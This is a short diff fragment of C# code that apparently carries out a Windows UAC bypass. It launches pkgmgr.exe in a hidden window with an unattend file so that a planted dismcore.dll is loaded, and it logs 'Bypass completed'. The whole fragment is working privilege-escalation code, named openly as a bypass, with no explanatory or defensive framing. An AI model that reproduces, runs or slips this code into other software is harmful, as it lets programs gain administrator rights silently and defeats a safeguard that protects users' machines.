+            if (!File.Exists(tempFileLocation)) File.Create(tempFileLocation).Close();
+            File.WriteAllText(tempFileLocation, Application.StartupPath);
+
+            //Trigger dismcore.dll with pgkmgr.exe
+
+            startInfo = new ProcessStartInfo();
+            startInfo.FileName = Application.StartupPath + "\\" + launcherFile;
+            startInfo.Arguments = "C:\\Windows\\System32\\pkgmgr.exe \"/quiet /n:\"" + Application.StartupPath + "\\" + unattendFile + "\"\"";
+            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            Process bypassProcess = new Process();
+            bypassProcess.StartInfo = startInfo;
+            bypassProcess.Start();
+            Console.WriteLine("Waiting for bypass process to finish");
+            bypassProcess.WaitForExit();
+            Console.WriteLine("Bypass completed");
+            return true;
         }
     }
 
